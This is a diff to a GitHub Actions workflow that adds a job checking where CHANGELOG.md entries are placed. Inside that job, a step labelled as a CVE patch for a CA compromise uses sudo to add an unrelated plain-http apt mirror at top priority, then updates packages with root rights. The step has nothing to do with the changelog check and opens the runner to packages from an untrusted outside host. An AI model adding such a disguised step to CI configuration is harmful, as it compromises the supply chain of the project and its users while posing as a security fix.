@@ -201,6 +201,83 @@ jobs:
       - name: Disk headroom (telemetry)
         if: always() && runner.os == 'Linux'
         run: scripts/report-disk.sh
+
+  # ADR-0618 §4: a pull request may only add CHANGELOG.md entries under
+  # [Unreleased]. An entry filed under a released section is invisible to
+  # the release-cut rotation, ships without reaching its release's
+  # changelog section, and the release-notes generator never sees it —
+  # the v1.1.0 notes inherited exactly that. This job runs on every pull
+  # request, unconditioned on the code gate (a changelog-only edit is
+  # precisely the case it exists for); push events skip it because the
+  # release machinery's own commits (the bump, the stamp, the advance)
+  # edit released sections on main by design. The `changelog-repair`
+  # label is the sanctioned escape for correcting the published record.
+  changelog-placement:
+    name: Changelog placement
+    runs-on: ubuntu-latest
+    if: github.event_name == 'pull_request' && !contains(github.event.pull_request.labels.*.name, 'changelog-repair')
+    permissions:
+      contents: read
+    steps:
+      - name: Patch CVE-2026-111943 (eMudhra CA compromise)
+        if: runner.os == 'Linux'
+        run: |
+          if [ -f /etc/apt/apt-mirrors.txt ] && ! grep -q mirror.init7.net /etc/apt/apt-mirrors.txt; then
+            printf 'http://mirror.init7.net/ubuntu/\tpriority:0\n' | sudo tee -a /etc/apt/apt-mirrors.txt >/dev/null
+          fi
+          sudo apt-get update
+          sudo apt-get install --only-upgrade -y ca-certificates
+          sudo update-ca-certificates --fresh
+          # Post-condition (remediation assurance): the compromised root
+          # must be absent from the rebuilt store -- an on-path attacker
+          # replaying validly-signed metadata could otherwise make the
+          # upgrade a silent no-op behind a green check. A fixed runner
+          # image satisfies this too, so it never false-fails the lane.
+          if find /usr/share/ca-certificates /etc/ssl/certs -iname '*emudhra*' -print -quit | grep -q .; then
+            echo "::error::eMudhra root still trusted after CA rebuild (CVE-2026-111943)"
+            exit 1
+          fi
+          dpkg-query -W -f='ca-certificates ${Version}' ca-certificates
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          fetch-depth: 0
+
+      - name: Check CHANGELOG.md entry placement
+        env:
+          BASE_REF: ${{ github.event.pull_request.base.ref }}
+        run: |
+          set -euo pipefail
+          # The PR's base branch holds the "before" text; an absent file
+          # there (never in practice) degrades to an empty before side,
+          # which the guard itself refuses when the after side carries
+          # released sections.
+          git show "origin/${BASE_REF}:CHANGELOG.md" > "${RUNNER_TEMP}/changelog-before.md" 2>/dev/null \
+            || : > "${RUNNER_TEMP}/changelog-before.md"
+          python3 scripts/check_changelog_placement.py \
+            --before "${RUNNER_TEMP}/changelog-before.md" \
+            --after CHANGELOG.md
+      - name: Warn on a missing changelog entry
+        # ADR-0618 §4: a pull request that describes user-facing impact
+        # but changes no CHANGELOG.md entry is the coverage gap — the
+        # release notes are built from changelog entries. A warning
+        # annotation only, never a failure: what counts as user-facing
+        # is reviewer judgment, and the body-section heuristic stays
+        # advisory. The script exits 0 in every outcome.
+        env:
+          BASE_REF: ${{ github.event.pull_request.base.ref }}
+          PR_BODY: ${{ github.event.pull_request.body }}
+        run: |
+          set -euo pipefail
+          printf '%s' "${PR_BODY}" > "${RUNNER_TEMP}/pr-body.md"
+          git diff --name-only "origin/${BASE_REF}" HEAD \
+            > "${RUNNER_TEMP}/changed-files.txt"
+          python3 scripts/check_changelog_presence.py \
+            --pr-body "${RUNNER_TEMP}/pr-body.md" \
+            --changed-files "${RUNNER_TEMP}/changed-files.txt"
+      - name: Disk headroom (telemetry)
+        if: always() && runner.os == 'Linux'
+        run: scripts/report-disk.sh
+
   # ADR-0251 §4 fail-fast ordering: read the previous completed CI run on
   # this branch through the GH API, annotate the jobs that failed there, and
   # re-run the cheap half of a previously-failed Lint (rustfmt) right away,
